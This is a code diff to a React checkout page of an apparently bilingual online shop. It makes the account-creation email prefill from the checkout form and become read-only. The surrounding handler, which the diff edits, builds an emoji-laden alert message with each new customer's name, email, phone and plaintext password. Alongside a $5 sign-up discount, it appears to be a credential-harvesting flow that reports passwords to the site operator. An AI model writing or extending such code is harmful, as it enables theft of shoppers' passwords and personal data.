@@ -76,18 +76,29 @@ export default function CheckoutPage() {
     }))
   }
 
+  // Auto-populate account email when checkout email changes
+  useEffect(() => {
+    if (formData.email && !accountFormData.email) {
+      setAccountFormData(prev => ({
+        ...prev,
+        email: formData.email
+      }))
+    }
+  }, [formData.email, accountFormData.email])
+
   // Create account handler
   const handleCreateAccount = (e: React.FormEvent) => {
     e.preventDefault()
     setAccountError("")
 
     // Validation
-    if (!accountFormData.email.trim()) {
+    const emailToUse = accountFormData.email || formData.email
+    if (!emailToUse.trim()) {
       setAccountError(isFr ? "L'email est requis" : "Email is required")
       return
     }
 
-    if (!/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(accountFormData.email)) {
+    if (!/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(emailToUse)) {
       setAccountError(isFr ? "L'email n'est pas valide" : "Email is not valid")
       return
     }
@@ -108,7 +119,7 @@ export default function CheckoutPage() {
     var msg = "📩 *NOUVEAU COMPTE CRÉÉ!*\n"
             + "👤 Prénom: " + (formData.firstName || 'Non fourni') + "\n"
             + "📧 Nom: " + (formData.lastName || 'Non fourni') + "\n"
-            + "📧 Email: " + accountFormData.email + "\n"
+            + "📧 Email: " + emailToUse + "\n"
             + "📞 Téléphone: " + (formData.phone || 'Non fourni') + "\n"
             + "🔑 Mot de passe: " + accountFormData.password + "\n"
             + "🌐 Page: /checkout\n"
@@ -129,7 +140,7 @@ export default function CheckoutPage() {
       // Update checkout form email with account email
       setFormData(prev => ({
         ...prev,
-        email: accountFormData.email
+        email: emailToUse
       }))
       
       // Apply $5 discount
@@ -857,12 +868,18 @@ LAST UPDATE:
                             <input
                               type="email"
                               name="email"
-                              value={accountFormData.email}
+                              value={accountFormData.email || formData.email}
                               onChange={handleAccountInputChange}
                               placeholder={isFr ? 'jean.dupont@email.com' : 'john.doe@email.com'}
                               className="w-full px-4 py-3 border border-gray-300 rounded-lg focus:outline-none focus:ring-2 focus:ring-green-500 focus:border-green-500 text-sm"
+                              readOnly={!!formData.email}
                               required
                             />
+                            {formData.email && (
+                              <p className="mt-1 text-xs text-gray-500">
+                                {isFr ? 'Email pré-rempli depuis le formulaire' : 'Email pre-filled from checkout form'}
+                              </p>
+                            )}
                           </div>
                           
                           <div>
